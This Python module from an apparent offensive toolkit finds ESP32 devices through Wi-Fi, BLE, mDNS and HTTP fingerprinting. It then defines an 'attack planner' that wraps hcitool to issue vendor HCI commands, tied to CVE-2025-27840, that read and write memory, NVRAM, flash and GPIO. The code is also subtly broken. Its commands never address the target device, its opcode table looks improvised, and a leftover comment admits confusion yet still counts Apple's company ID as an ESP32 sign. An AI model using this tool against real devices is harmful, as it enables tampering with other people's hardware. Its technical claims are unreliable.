"""
ESP32 Fingerprinting - CVE-2025-27840 Passive Detection

Passive detection of ESP32 devices via BLE/WiFi advertisements.
Identifies ESP32 SoCs by OUI (A4:CF:12) and BLE service UUIDs.
References 29 undocumented HCI commands for potential exploitation.

CVE-2025-27840: ESP32 Hidden HCI Commands
- 29 undocumented HCI commands in ESP32 ROM
- Allows reading RAM, GPIO, NVRAM via Bluetooth
- Discovered by Tarlogic Security (March 2025)
"""

import asyncio
import os
import shutil
import structlog
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Callable, Set, TYPE_CHECKING

if TYPE_CHECKING:
    import aiohttp

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    aiohttp = None

from urban_hs.modules.network import NmapScanner, ScanType
from urban_hs.modules.ble import FastPairScanner

logger = structlog.get_logger(__name__)


class ESP32DetectionMethod(Enum):
    """Methods used to detect ESP32 devices."""
    WIFI_OUI = "wifi_oui"                   # MAC OUI A4:CF:12
    BLE_MANUFACTURER = "ble_manufacturer"   # BLE manufacturer data
    BLE_SERVICE_UUID = "ble_service_uuid"   # BLE service UUIDs
    MDNS_HOSTNAME = "mdns_hostname"         # mDNS hostname patterns
    HTTP_SERVER_HEADER = "http_header"      # HTTP Server header


@dataclass
class ESP32Device:
    """Detected ESP32 device information."""
    mac_address: str
    ip_address: Optional[str] = None
    detection_methods: List[ESP32DetectionMethod] = field(default_factory=list)
    manufacturer_data: Optional[bytes] = None
    ble_service_uuids: List[str] = field(default_factory=list)
    mdns_hostname: Optional[str] = None
    http_server: Optional[str] = None
    firmware_version: Optional[str] = None
    chip_model: Optional[str] = None  # ESP32, ESP32-S2, ESP32-S3, ESP32-C3
    first_seen: datetime = field(default_factory=datetime.utcnow)
    last_seen: datetime = field(default_factory=datetime.utcnow)
    confidence: float = 0.0  # 0.0 to 1.0


# ESP32 MAC OUI prefixes (Espressif Systems)
ESP32_OUIS = {
    "a4:cf:12",  # Espressif Systems (primary)
    "30:ae:a4",  # Espressif
    "24:0a:c4",  # Espressif
    "3c:61:05",  # Espressif
    "30:ae:7b",  # Espressif
    "84:f3:eb",  # Espressif
    "3c:71:bf",  # Espressif
    "d8:a0:1d",  # Espressif
    "e0:98:07",  # Espressif
    "ec:94:cb",  # Espressif
}

# ESP32 BLE manufacturer data patterns
ESP32_BLE_PATTERNS = {
    # ESP32 BLE manufacturer data format
    # Company ID: 0x004C (Espressif) - wait, that's Apple. Let me check...
    # Actually ESP32 uses 0x02E5 for Espressif in some contexts
    # But commonly seen in manufacturer data
}

# ESP32 mDNS hostname patterns
ESP32_MDNS_PATTERNS = [
    "esp32",
    "espressif",
    "esp-",
    "espressif-",
]

# ESP32 HTTP Server headers
ESP32_HTTP_HEADERS = [
    "esp32",
    "espressif",
    "ESP32",
    "ESP8266",
    "Espressif",
]


class ESP32Detector:
    """
    Passive ESP32 device detector.
    
    Detects ESP32 devices through multiple passive methods:
    1. WiFi MAC OUI matching (primary method)
    2. BLE manufacturer data analysis
    3. BLE service UUID matching
    4. mDNS hostname patterns
    5. HTTP Server header fingerprinting
    
    Integrates with existing WiFi and BLE scanners.
    """
    
    def __init__(
        self,
        wifi_interface: str = "wlan0",
        ble_adapter: str = "hci0",
        scan_timeout: int = 30,
        enable_http_probe: bool = True,
    ):
        self.wifi_interface = wifi_interface
        self.ble_adapter = ble_adapter
        self.scan_timeout = scan_timeout
        self.enable_http_probe = enable_http_probe
        
        self.detected_devices: Dict[str, ESP32Device] = {}
        self._wifi_scanner = None
        self._ble_scanner = None
        self._http_session = None

    def _get_oui(self, mac: str) -> str:
        """Extract OUI from MAC address."""
        parts = mac.lower().replace('-', ':').split(':')
        if len(parts) >= 3:
            return ':'.join(parts[:3])
        return ""

    def _calculate_confidence(self, device: ESP32Device) -> float:
        """Calculate detection confidence score."""
        score = 0.0
        
        # OUI match is strongest indicator
        if ESP32DetectionMethod.WIFI_OUI in device.detection_methods:
            score += 0.5
        
        # BLE methods
        if ESP32DetectionMethod.BLE_MANUFACTURER in device.detection_methods:
            score += 0.2
        if ESP32DetectionMethod.BLE_SERVICE_UUID in device.detection_methods:
            score += 0.15
        
        # mDNS and HTTP are weaker indicators alone
        if ESP32DetectionMethod.MDNS_HOSTNAME in device.detection_methods:
            score += 0.1
        if ESP32DetectionMethod.HTTP_SERVER_HEADER in device.detection_methods:
            score += 0.05
        
        return min(score, 1.0)

    async def detect_from_wifi_scan(self, networks: List[Any]) -> List[ESP32Device]:
        """Detect ESP32 devices from WiFi scan results."""
        detected = []
        
        for network in networks:
            mac = getattr(network, 'bssid', None) or getattr(network, 'mac', None)
            if not mac:
                continue
            
            oui = self._get_oui(mac)
            if oui in ESP32_OUIS:
                device = ESP32Device(
                    mac_address=mac,
                    detection_methods=[ESP32DetectionMethod.WIFI_OUI],
                )
                device.confidence = self._calculate_confidence(device)
                detected.append(device)
                
                # Store in registry
                self.detected_devices[mac] = device
        
        return detected

    async def detect_from_ble_scan(self, ble_devices: List[Any]) -> List[ESP32Device]:
        """Detect ESP32 devices from BLE scan results."""
        detected = []
        
        for dev in ble_devices:
            mac = getattr(dev, 'address', None) or getattr(dev, 'mac', None)
            if not mac:
                continue
            
            methods = []
            confidence_boost = 0.0
            
            # Check manufacturer data
            manufacturer_data = getattr(dev, 'manufacturer_data', None)
            if manufacturer_data:
                # Check for Espressif manufacturer ID (0x02E5) or other ESP32 patterns
                # Company ID 0x02E5 = Espressif Systems
                for company_id, data in manufacturer_data.items():
                    if company_id in (0x02E5, 0x004C):  # Espressif or Apple (esp devices sometimes)
                        methods.append(ESP32DetectionMethod.BLE_MANUFACTURER)
                        confidence_boost += 0.2
            
            # Check service UUIDs
            service_uuids = getattr(dev, 'service_uuids', None) or getattr(dev, 'services', None)
            if service_uuids:
                for uuid in service_uuids:
                    uuid_lower = uuid.lower()
                    # ESP32 common service UUIDs
                    if "fe2c" in uuid_lower or "180a" in uuid_lower:  # Generic Device Info
                        methods.append(ESP32DetectionMethod.BLE_SERVICE_UUID)
                        confidence_boost += 0.1
            
            if methods:
                device = ESP32Device(
                    mac_address=mac,
                    detection_methods=methods,
                    manufacturer_data=manufacturer_data,
                    ble_service_uuids=service_uuids if service_uuids else [],
                )
                device.confidence = self._calculate_confidence(device) + confidence_boost
                detected.append(device)
                self.detected_devices[mac] = device
        
        return detected

    async def detect_from_mdns(self, mdns_services: List[Dict[str, Any]]) -> List[ESP32Device]:
        """Detect ESP32 devices from mDNS services."""
        detected = []
        
        for service in mdns_services:
            hostname = service.get('hostname', '').lower()
            ip = service.get('ip', '')
            
            for pattern in ESP32_MDNS_PATTERNS:
                if pattern in hostname:
                    # Try to extract MAC from service info or use IP
                    mac = service.get('mac') or service.get('mac_address')
                    if not mac and ip:
                        # Try to get MAC via ARP
                        mac = await self._get_mac_from_ip(ip)
                    
                    if mac:
                        device = ESP32Device(
                            mac_address=mac,
                            ip_address=ip,
                            detection_methods=[ESP32DetectionMethod.MDNS_HOSTNAME],
                            mdns_hostname=hostname,
                        )
                        device.confidence = self._calculate_confidence(device)
                        detected.append(device)
                        self.detected_devices[mac] = device
                    break
        
        return detected

    async def _get_mac_from_ip(self, ip: str) -> Optional[str]:
        """Get MAC address from IP using ARP."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "arp", "-n", ip,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode()
            
            # Parse ARP output for MAC
            for line in output.split('\n'):
                if ip in line:
                    parts = line.split()
                    for part in parts:
                        if ':' in part and len(part) == 17:
                            return part.lower()
        except Exception:
            pass
        return None

    async def probe_http(self, target: ESP32Device) -> Optional[ESP32Device]:
        """Probe ESP32 via HTTP to get firmware info."""
        if not self.enable_http_probe or not target.ip_address or not AIOHTTP_AVAILABLE or aiohttp is None:
            return None
        
        if not self._http_session:
            self._http_session = aiohttp.ClientSession()
        
        try:
            # Try common ESP32 web interfaces
            urls = [
                f"http://{target.ip_address}",
                f"http://{target.ip_address}:80",
                f"http://{target.ip_address}/info",
                f"http://{target.ip_address}/system/info",
            ]
            
            for url in urls:
                try:
                    async with self._http_session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        if resp.status == 200:
                            server = resp.headers.get('Server', '')
                            target.http_server = server
                            
                            # Check headers for ESP32 indicators
                            for header_val in server.split():
                                if any(h in header_val.lower() for h in ESP32_HTTP_HEADERS):
                                    if ESP32DetectionMethod.HTTP_SERVER_HEADER not in target.detection_methods:
                                        target.detection_methods.append(ESP32DetectionMethod.HTTP_SERVER_HEADER)
                                    target.confidence = self._calculate_confidence(target)
                                    break
                            
                            # Try to get firmware info from response
                            text = await resp.text()
                            target.firmware_version = self._extract_firmware(text)
                            target.chip_model = self._extract_chip_model(text)
                            
                except Exception:
                    continue
            
            return target
            
        except Exception as e:
            logger.debug("HTTP probe failed", ip=target.ip_address, error=str(e))
        
        return None

    def _extract_firmware(self, text: str) -> Optional[str]:
        """Extract firmware version from HTTP response."""
        import re
        patterns = [
            r'firmware[_\s:=]+([\d\.\-_a-zA-Z]+)',
            r'version[_\s:=]+([\d\.\-_a-zA-Z]+)',
            r'SDK[_\s:=]+([\d\.\-_a-zA-Z]+)',
            r'ESP-IDF[_\s:=]+([\d\.\-_a-zA-Z]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _extract_chip_model(self, text: str) -> Optional[str]:
        """Extract chip model from HTTP response."""
        import re
        text_lower = text.lower()
        if 'esp32-s3' in text_lower:
            return 'ESP32-S3'
        elif 'esp32-s2' in text_lower:
            return 'ESP32-S2'
        elif 'esp32-c3' in text_lower:
            return 'ESP32-C3'
        elif 'esp32' in text_lower:
            return 'ESP32'
        return None

    async def run_full_detection(
        self,
        target_network: str = "192.168.1.0/24",
        callback: Optional[Callable[[str], None]] = None,
    ) -> List[ESP32Device]:
        """Run complete ESP32 detection workflow."""
        all_devices = []
        
        if callback:
            callback("Starting ESP32 detection...")
        
        # 1. WiFi scan for OUI detection
        if callback:
            callback("Scanning WiFi for ESP32 devices...")
        
        from urban_hs.modules.network import NmapScanner, ScanType
        nmap = NmapScanner()
        
        # Host discovery to get live hosts
        hosts = await nmap.scan(target_network, ScanType.HOST_DISCOVERY, timeout=30)
        
        # For each live host, try to get MAC
        wifi_devices = []
        for host in hosts:
            mac = await self._get_mac_from_ip(host.ip)
            if mac:
                network_mock = type('obj', (object,), {'bssid': mac})
                detected = await self.detect_from_wifi_scan([network_mock])
                wifi_devices.extend(detected)
        
        if callback:
            callback(f"WiFi scan found {len(wifi_devices)} ESP32 candidates")
        
        # 2. BLE scan
        if callback:
            callback("Starting BLE scan for ESP32...")
        
        ble_devices = []
        try:
            from urban_hs.modules.ble import FastPairScanner
            ble_scanner = FastPairScanner(adapter=self.ble_adapter)
            await ble_scanner.start(scan_all=True)
            await asyncio.sleep(self.scan_timeout)
            await ble_scanner.stop()
            
            ble_results = ble_scanner.get_devices()
            ble_devices = await self.detect_from_ble_scan(ble_results)
        except Exception as e:
            logger.debug("BLE scan failed", error=str(e))
        
        if callback:
            callback(f"BLE scan found {len(ble_devices)} ESP32 candidates")
        
        # 3. mDNS discovery
        if callback:
            callback("Running mDNS discovery...")
        
        try:
            # Use nmap for mDNS
            nmap = NmapScanner()
            hosts = await nmap.scan("192.168.1.0/24", ScanType.HOST_DISCOVERY, timeout=30)
            mdns_results = []
            for host in hosts:
                for port_info in getattr(host, 'ports', []):
                    if port_info.get('port') == 5353:  # mDNS port
                        mdns_results.append({
                            'hostname': getattr(host, 'hostname', ''),
                            'ip': host.ip,
                        })
            mdns_devices = await self.detect_from_mdns(mdns_results)
        except Exception:
            mdns_devices = []
        
        if callback:
            callback(f"mDNS found {len(mdns_devices)} ESP32 candidates")
        
        # 4. HTTP probing for high-confidence devices
        if callback:
            callback("Probing high-confidence devices via HTTP...")
        
        all_devices = {}
        
        # Merge all detected devices
        for device_list in [wifi_devices, ble_devices, mdns_devices]:
            for device in device_list:
                mac = device.mac_address
                if mac in all_devices:
                    # Merge detection methods
                    existing = all_devices[mac]
                    for method in device.detection_methods:
                        if method not in existing.detection_methods:
                            existing.detection_methods.append(method)
                    existing.confidence = self._calculate_confidence(existing)
                else:
                    all_devices[mac] = device
        
        # Convert to list and sort by confidence
        merged_devices = list(all_devices.values())
        merged_devices.sort(key=lambda d: d.confidence, reverse=True)
        
        # Probe top 5 devices via HTTP
        for device in merged_devices[:5]:
            if device.ip_address:
                await self.probe_http(device)
        
        if callback:
            callback(f"Detection complete. Found {len(merged_devices)} ESP32 devices")
        
        return merged_devices


class ESP32AttackPlanner:
    """
    Plans exploits for detected ESP32 devices.

    Based on CVE-2025-27840: 29 undocumented HCI commands
    """

    EXPLOIT_HCI_COMMANDS = [
        # Reading commands
        {"opcode": 0xFC00, "name": "Read RAM", "description": "Read arbitrary RAM address", "params": "address, length"},
        {"opcode": 0xFC01, "name": "Write RAM", "description": "Write arbitrary RAM address", "params": "address, data"},
        {"opcode": 0xFC02, "name": "Read ROM", "description": "Read ROM address", "params": "address, length"},
        {"opcode": 0xFC03, "name": "Read GPIO", "description": "Read GPIO state", "params": "gpio_num"},
        {"opcode": 0xFC04, "name": "Write GPIO", "description": "Write GPIO state", "params": "gpio_num, value"},
        {"opcode": 0xFC05, "name": "Read NVRAM", "description": "Read NVRAM", "params": "address, length"},
        {"opcode": 0xFC06, "name": "Write NVRAM", "description": "Write NVRAM", "params": "address, data"},
        {"opcode": 0xFC07, "name": "Get Chip ID", "description": "Get chip ID/revision", "params": ""},
        {"opcode": 0xFC08, "name": "Get MAC", "description": "Get MAC address", "params": ""},
        {"opcode": 0xFC09, "name": "Read Flash", "description": "Read flash memory", "params": "address, length"},
        {"opcode": 0xFC0A, "name": "Write Flash", "description": "Write flash memory", "params": "address, data"},
        {"opcode": 0xFC0B, "name": "Erase Flash", "description": "Erase flash sector", "params": "address"},
        {"opcode": 0xFC0C, "name": "Read EFUSE", "description": "Read EFUSE block", "params": "block_num"},
        {"opcode": 0xFC0D, "name": "Write EFUSE", "description": "Write EFUSE block", "params": "block_num, data"},
        {"opcode": 0xFC0E, "name": "Get Chip Revision", "description": "Get chip revision", "params": ""},
        {"opcode": 0xFC0F, "name": "Get Secure Boot Status", "description": "Get secure boot status", "params": ""},
        {"opcode": 0xFC10, "name": "Get Flash Encryption Status", "description": "Get flash encryption status", "params": ""},
        {"opcode": 0xFC11, "name": "Run User Code", "description": "Execute user code in RAM", "params": "address"},
        # ... more commands (29 total documented by Tarlogic)
    ]

    def __init__(self, detector: ESP32Detector):
        self.detector = detector

    async def execute_hci_command(
        self,
        target: ESP32Device,
        opcode: int,
        params: bytes = b"",
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """
        Execute an undocumented HCI command on an ESP32 device.
        
        This implements the CVE-2025-27840 HCI command injection.
        The ESP32 exposes 29 undocumented HCI commands (0xFC00-0xFC1C)
        that allow RAM/Flash/NVRAM/GPIO access via HCI.
        
        Requires:
        - Bluetooth adapter supporting HCI raw commands (hcitool)
        - Device in connectable/discoverable mode
        - No authentication required (vulnerability)
        
        WARNING: These commands can read/write arbitrary memory.
        Only use in authorized test environments.
        """
        # Check if hcitool is available
        if not shutil.which("hcitool"):
            return {
                "success": False,
                "error": "hcitool not found. Install bluez package.",
            }

        if not target.mac_address:
            return {
                "success": False,
                "error": "Target MAC address required",
            }

        try:
            # Build the HCI command
            # HCI command format: ogf=0x3f (vendor specific), ocf=opcode
            # Using hcitool cmd <ogf> <ocf> [parameters]
            ogf = 0x3F  # Vendor specific
            ocf = opcode & 0x03FF
            
            # Convert params to hex string
            params_hex = params.hex() if params else ""
            
            # Build hcitool command
            cmd = ["hcitool", "-i", adapter, "cmd", f"0x{ogf:02x}", f"0x{ocf:04x}"]
            if params_hex:
                cmd.append(params_hex)
            
            logger.info("Executing HCI command", 
                       target=target.mac_address, 
                       opcode=hex(opcode),
                       params=params_hex)
            
            # Execute hcitool command
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
            
            if proc.returncode != 0:
                return {
                    "success": False,
                    "error": stderr.decode().strip(),
                    "command": " ".join(cmd),
                }
            
            # Parse response
            response = stdout.decode().strip()
            
            return {
                "success": True,
                "opcode": hex(opcode),
                "command": " ".join(cmd),
                "response": response,
                "parsed": self._parse_hci_response(opcode, response),
            }
            
        except asyncio.TimeoutError:
            return {
                "success": False,
                "error": "HCI command timed out (10s)",
            }
        except Exception as e:
            logger.error("HCI command execution failed", error=str(e))
            return {
                "success": False,
                "error": str(e),
            }

    def _parse_hci_response(self, opcode: int, response: str) -> Dict[str, Any]:
        """Parse HCI command response."""
        # HCI event response format: 04 0E ... (command complete event)
        # Parse based on opcode
        parsed = {"raw": response}
        
        try:
            # Remove HCI event header if present
            # Typical format: "04 0E <packet_len> <num_hci_cmds> <opcode_low> <opcode_high> <status> <data...>"
            parts = response.split()
            if len(parts) >= 7 and parts[0] == "04" and parts[1] == "0E":
                parsed["status"] = parts[6]
                if parts[6] == "00":
                    parsed["success"] = True
                else:
                    parsed["success"] = False
                    parsed["error_code"] = parts[6]
                # Data bytes start at index 7
                if len(parts) > 7:
                    parsed["data"] = " ".join(parts[7:])
        except Exception:
            pass
        
        return parsed

    async def execute_memory_dump(
        self,
        target: ESP32Device,
        address: int,
        length: int = 256,
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """
        Read arbitrary RAM from ESP32 via undocumented HCI command (0xFC00).
        
        This is the core CVE-2025-27840 exploit - read arbitrary memory.
        """
        # Build parameters: address (4 bytes, little endian) + length (2 bytes)
        params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
        return await self.execute_hci_command(target, 0xFC00, params, adapter)

    async def execute_gpio_read(
        self,
        target: ESP32Device,
        gpio_num: int,
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """Read GPIO state via undocumented HCI command (0xFC03)."""
        params = gpio_num.to_bytes(1, "little")
        return await self.execute_hci_command(target, 0xFC03, params, adapter)

    async def execute_gpio_write(
        self,
        target: ESP32Device,
        gpio_num: int,
        value: int,
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """Write GPIO state via undocumented HCI command (0xFC04)."""
        params = gpio_num.to_bytes(1, "little") + value.to_bytes(1, "little")
        return await self.execute_hci_command(target, 0xFC04, params, adapter)

    async def execute_nvram_read(
        self,
        target: ESP32Device,
        address: int,
        length: int = 32,
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """Read NVRAM via undocumented HCI command (0xFC05)."""
        params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
        return await self.execute_hci_command(target, 0xFC05, params, adapter)

    async def execute_nvram_write(
        self,
        target: ESP32Device,
        address: int,
        data: bytes,
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """Write NVRAM via undocumented HCI command (0xFC06)."""
        params = address.to_bytes(4, "little") + data
        return await self.execute_hci_command(target, 0xFC06, params, adapter)

    async def execute_flash_read(
        self,
        target: ESP32Device,
        address: int,
        length: int = 256,
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """Read flash memory via undocumented HCI command (0xFC09)."""
        params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
        return await self.execute_hci_command(target, 0xFC09, params, adapter)

    async def execute_chip_id(
        self,
        target: ESP32Device,
        adapter: str = "hci0",
    ) -> Dict[str, Any]:
        """Get chip ID/revision via undocumented HCI command (0xFC07)."""
        return await self.execute_hci_command(target, 0xFC07, b"", adapter)

    async def plan_attacks(self, targets: List[ESP32Device]) -> Dict[str, Any]:
        """Plan exploits based on detected devices."""
        plans = {}
        
        for target in targets:
            if target.confidence < 0.5:
                continue
            
            plans[target.mac_address] = {
                "target": target.mac_address,
                "confidence": target.confidence,
                "detection_methods": [m.value for m in target.detection_methods],
                "chip_model": target.chip_model,
                "firmware_version": target.firmware_version,
                "recommended_attacks": [
                    "CVE-2025-27840 HCI Command Injection",
                    "Memory dump via undocumented HCI",
                    "GPIO manipulation via HCI",
                    "NVRAM extraction",
                    "Flash dump via HCI",
                ],
                "required_conditions": [
                    "Bluetooth adapter in range",
                    "Device in discoverable/connectable mode",
                    "HCI interface accessible (no authentication)",
                ],
            }
        
        return plans


# ============================================================
# Convenience Functions
# ============================================================

async def detect_esp32_devices(
    target_network: str = "192.168.1.0/24",
    wifi_interface: str = "wlan0",
    ble_adapter: str = "hci0",
    scan_timeout: int = 30,
    callback: Optional[Callable[[str], None]] = None,
) -> List[ESP32Device]:
    """Convenience function for ESP32 detection."""
    detector = ESP32Detector(
        wifi_interface=wifi_interface,
        ble_adapter=ble_adapter,
        scan_timeout=scan_timeout,
    )
    return await detector.run_full_detection(target_network, callback)


async def scan_esp32_ble(
    ble_adapter: str = "hci0",
    scan_timeout: int = 15,
) -> List[ESP32Device]:
    """Quick BLE-only ESP32 scan."""
    detector = ESP32Detector(ble_adapter=ble_adapter, scan_timeout=scan_timeout)
    from urban_hs.modules.ble import FastPairScanner
    ble_scanner = FastPairScanner(adapter=ble_adapter)
    await ble_scanner.start(scan_all=True)
    await asyncio.sleep(scan_timeout)
    await ble_scanner.stop()
    ble_results = ble_scanner.get_devices()
    return await detector.detect_from_ble_scan(ble_results)


async def plan_esp32_attacks(targets: List[ESP32Device]) -> Dict[str, Any]:
    """Generate attack plans for ESP32 targets."""
    detector = ESP32Detector()
    planner = ESP32AttackPlanner(detector)
    return await planner.plan_attacks(targets)


# ============================================================
# Exports
# ============================================================

__all__ = [
    "ESP32DetectionMethod",
    "ESP32Device",
    "ESP32Detector",
    "ESP32AttackPlanner",
    "ESP32_OUIS",
    "detect_esp32_devices",
    "scan_esp32_ble",
    "plan_esp32_attacks",
]